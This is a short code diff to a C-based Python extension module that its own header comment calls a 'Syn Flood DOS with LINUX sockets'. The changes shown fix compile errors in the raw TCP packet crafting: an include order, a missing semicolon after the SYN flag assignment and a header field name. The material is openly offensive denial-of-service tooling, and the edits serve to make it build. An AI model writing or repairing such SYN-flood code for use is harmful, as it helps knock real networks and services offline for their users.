@@ -1,9 +1,9 @@
 /*
     Syn Flood DOS with LINUX sockets, thanks binarytides.com!
 */
+#include <stdio.h>
 #define __USE_BSD 1 //Set linux ip headers to use BSD style headers
 #define __FAVOR_BSD 1 //Set linux tcp headers to use BSD style headers
-#include <stdio.h>
 #include <netinet/tcp.h>   //Provides declarations for tcp header
 #include <netinet/ip.h>    //Provides declarations for ip header
 #include <Python.h>
@@ -135,11 +135,11 @@ static PyObject * synmod_init(PyObject *self, PyObject* args)
     tcph->psh=0;
     tcph->ack=0;
     tcph->urg=0;*/
-    tcph->th_flags = TH_SYN
+    tcph->th_flags = TH_SYN;
     tcph->th_win = htons(5840); /* maximum allowed window size */
     tcph->th_sum = 0;/* if you set a checksum to zero, your kernel's IP stack
                 should fill in the correct checksum during transmission */
-    tcph->urp = 0;
+    tcph->th_urp = 0;
     //Now the IP checksum
  
     psh.source_address = inet_addr(src_addr);
